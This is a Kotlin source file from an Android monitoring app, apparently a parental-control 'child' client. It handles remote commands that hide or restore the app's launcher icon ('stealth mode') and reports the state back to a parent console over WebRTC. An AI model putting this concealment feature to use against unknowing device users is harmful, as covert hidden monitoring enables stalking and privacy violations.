package com.nexus.child.components.stealth

import android.util.Log

/**
 * Coordinates Stealth Mode commands and status notifications between the Desktop Parent Console
 * and the Android Child device over the WebRTC DataChannel.
 *
 * Hey friend! Here is the communication protocol handled here:
 * 1. "STEALTH_ON" -> Activates stealth mode (hides launcher icon).
 *    Responds with "STEALTH_ON_ACK" and "STEALTH_STATUS:ON".
 * 2. "STEALTH_OFF" -> Deactivates stealth mode (restores launcher icon).
 *    Responds with "STEALTH_OFF_ACK" and "STEALTH_STATUS:OFF".
 * 3. "GET_STEALTH_STATUS" -> Queries current stealth state.
 *    Responds with "STEALTH_STATUS:ON" or "STEALTH_STATUS:OFF".
 *
 * During initial connection, sendStatusUpdate() is invoked by NexusBackgroundService to
 * immediately synchronize the parent dashboard button and status badge!
 */
class StealthCommandHandler(
    private val stealthController: IStealthController,
    private val dataSender: (message: String) -> Boolean
) {

    companion object {
        private const val TAG = "StealthCommandHandler"

        // Commands incoming from Parent Console
        const val CMD_STEALTH_ON = "STEALTH_ON"
        const val CMD_STEALTH_OFF = "STEALTH_OFF"
        const val CMD_GET_STEALTH_STATUS = "GET_STEALTH_STATUS"

        // Acknowledgements dispatched to Parent Console
        const val ACK_STEALTH_ON = "STEALTH_ON_ACK"
        const val ACK_STEALTH_OFF = "STEALTH_OFF_ACK"

        // Telemetry status notifications
        const val STATUS_STEALTH_ON = "STEALTH_STATUS:ON"
        const val STATUS_STEALTH_OFF = "STEALTH_STATUS:OFF"
    }

    /**
     * Inspects incoming DataChannel strings and routes stealth control requests.
     *
     * @param command Raw message received over WebRTC DataChannel
     * @return true if handled by this component; false otherwise.
     */
    fun handleCommand(command: String): Boolean {
        return when (command.trim()) {
            CMD_STEALTH_ON -> {
                handleStealthOn()
                true
            }
            CMD_STEALTH_OFF -> {
                handleStealthOff()
                true
            }
            CMD_GET_STEALTH_STATUS -> {
                sendStatusUpdate()
                true
            }
            else -> false
        }
    }

    /**
     * Activates stealth mode and transmits acknowledgement and updated status.
     */
    private fun handleStealthOn() {
        Log.d(TAG, "Activating stealth mode via parent command...")
        val success = stealthController.setStealthMode(true)
        if (success) {
            dataSender(ACK_STEALTH_ON)
            dataSender(STATUS_STEALTH_ON)
            Log.d(TAG, "Dispatched $ACK_STEALTH_ON and $STATUS_STEALTH_ON to parent")
        } else {
            Log.e(TAG, "Failed to activate stealth mode on parent command")
            // Send current actual status
            sendStatusUpdate()
        }
    }

    /**
     * Deactivates stealth mode and transmits acknowledgement and updated status.
     */
    private fun handleStealthOff() {
        Log.d(TAG, "Deactivating stealth mode via parent command...")
        val success = stealthController.setStealthMode(false)
        if (success) {
            dataSender(ACK_STEALTH_OFF)
            dataSender(STATUS_STEALTH_OFF)
            Log.d(TAG, "Dispatched $ACK_STEALTH_OFF and $STATUS_STEALTH_OFF to parent")
        } else {
            Log.e(TAG, "Failed to deactivate stealth mode on parent command")
            sendStatusUpdate()
        }
    }

    /**
     * Sends the current stealth state to the parent console.
     * Called automatically upon WebRTC DataChannel connection.
     */
    fun sendStatusUpdate() {
        val isHidden = stealthController.isStealthMode()
        val statusMsg = if (isHidden) STATUS_STEALTH_ON else STATUS_STEALTH_OFF
        dataSender(statusMsg)
        Log.d(TAG, "Transmitted stealth state to parent: $statusMsg")
    }

    /**
     * Lifecycle callback when WebRTC peer connection terminates.
     */
    fun onPeerDisconnected() {
        Log.d(TAG, "Peer disconnected. Stealth mode state persists.")
    }

    /**
     * Cleanup resources.
     */
    fun cleanup() {
        Log.d(TAG, "StealthCommandHandler cleaned up.")
    }
}
